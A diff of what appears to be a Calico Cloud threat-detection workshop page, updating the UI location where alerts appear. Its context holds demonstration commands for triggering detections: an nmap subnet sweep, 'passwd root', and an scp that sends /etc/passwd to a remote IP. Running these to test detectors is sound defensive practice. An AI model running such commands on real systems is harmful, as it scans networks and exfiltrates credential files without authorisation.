@@ -39,7 +39,7 @@ Our threat detection engine also monitors activity within the containers running
    nmap -sn $(hostname -i)/24
    ```
    
-   Wait a minute and look in the Calico Cloud UI in the `Activity` > `Alerts`.
+   Wait a minute and look in the Calico Cloud UI in the `Threat Defense` > `Security Events`.
 
    Optionally, you can also try the following;
    
@@ -47,7 +47,11 @@ Our threat detection engine also monitors activity within the containers running
    passwd root
    scp -o ConnectTimeout=3 /etc/passwd goomba@198.13.47.158:/tmp/
    ```
-   Wait another minute and look in the Calico Cloud UI in the `Activity` > `Alerts` again.
+   Wait another minute and look in the Calico Cloud UI in the `Threat Defense` > `Security Events` again.
+
+   You should be able to see the following security events:
+
+   
 
 --- 
 
